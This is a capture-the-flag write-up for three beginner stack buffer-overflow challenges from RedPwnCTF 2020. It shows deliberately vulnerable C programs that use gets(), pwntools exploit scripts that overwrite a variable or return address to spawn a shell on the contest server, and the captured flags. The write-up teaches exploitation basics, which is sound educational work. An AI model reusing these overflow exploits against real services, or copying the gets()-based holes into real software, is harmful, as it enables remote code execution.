---
id: 0
title: "Writeup for RedPwnCTF 2020 coffer-overflow-0, 1, 2"
subtitle: "Beginner's Pwn"
date: "2020.26.06"
tags: "ctf, linux-bof"
---

# coffer-overflow 0

### Basics of the basics
So, how do we approach this question? We can take a look at the source provided (coffer-overflow-0.c):
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
	long code = 0;
	char name[16];
  
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);

	puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
	puts("What do you want to fill your coffer with?");

	gets(name);

	if(code != 0) {
		system("/bin/sh");
	}
}
```

It looks like a standard buffer overflow question where the vulnerability here is gets(), which does not specify the amount of bytes it should accept. Since the variable we're writing to, `char name[16]` has a allocated buffer size of 16, we just need to overflow past that to start overwriting the variables we want, which in this case is `code`.

This is our target line:
```c
if(code != 0) {
		system("/bin/sh");
	}
```

As long as we are able to overwrite `code`, it doesn't matter what we overwrite it with, it will redirect us to shell.
Since stack space is generally allocated in multiples of 16, and this function declares `16+8=24 < 32` bytes for the variables, we can assume 32 bytes would be allocated to the function. Hence we just need to overwrite into the last 8 bytes of the stack and we should overwrite `code`. The length of our exploit would be 32-8+1 = 25.

Here is the final exploit:
```python
#!/usr/bin/env python

from pwn import *
e = ELF("./coffer-overflow-0")
p = remote("2020.redpwnc.tf", 31199)

p.recvline()
p.recvline()
p.sendline("A"*25)
p.interactive()
```

This should redirect us to shell, and with a simple `ls` we can see an entry `flag.txt`, so we simply do `cat flag.txt` to obtain the flag:
```
$ ls
Makefile
bin
coffer-overflow-0
coffer-overflow-0.c
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{b0ffer_0verf10w_3asy_as_123}
```

# coffer-overflow-1

### Slightly more advanced
We take a look at the source code:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
	long code = 0;
	char name[16];
	
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);

	puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
	puts("What do you want to fill your coffer with?");

	gets(name);

	if(code == 0xcafebabe) {
		system("/bin/sh");
	}
}
```

This time, we would need to not only overwrite `code`, but also overwrite it with value `0xcafebabe` in little endian.
We use the same approach as before, with a padding of 32-8 = 24 characters followed by `0xcafebabe` in little endian.

Here is the final exploit:
```python
#!/usr/bin/env python

from pwn import *

e = ELF("./coffer-overflow-1")
p = remote("2020.redpwnc.tf", 31255)

print(p.recvline())
print(p.recvline())
payload = b"A"*24
payload += p64(0xcafebabe)
p.sendline(payload)
p.interactive()
```

This should redirect us to shell:
```
$ ls
Makefile
bin
coffer-overflow-1
coffer-overflow-1.c
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```

# coffer-overflow-2

### Ret 2 bin?
Similarly, we take a quick look at the source code:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
	long code = 0;
	char name[16];
  
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	setbuf(stderr, NULL);

	puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
	puts("What do you want to fill your coffer with?");

	gets(name);

}

void binFunction() {
	system("/bin/sh");
}
```

Ah, now we get to ROP. We simply need to ROP to binFunction() to execute it, which will redirect us to shell.

There are many ways to find the address of the function, we can use `objdump -d` to find the address of binFunction():
```
$ objdump -d coffer-overflow-2 | grep binFunction
00000000004006e6 <binFunction>:
```

Now we just need to overwrite the `rip` register with this value in little endian.
We take 16 random characters + 8 to overwrite the `rbp` register for a padding of 24.

Here is the final exploit:
```python
#!/usr/bin/env python

from pwn import *

e = ELF("./coffer-overflow-2")
p = remote("2020.redpwnc.tf", 31908)

print(p.recvline())
print(p.recvline())
payload = b"A"*24
payload += p64(0x4006e6)
p.sendline(payload)
p.interactive()
```

This redirects us to shell:
```
$ ls
Makefile
bin
coffer-overflow-2
coffer-overflow-2.c
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
```

# Final words
Overall, these challenges were pretty easy and meant for beginner CTF players, but it was still good practice to get used to the most basic form buffer overflow.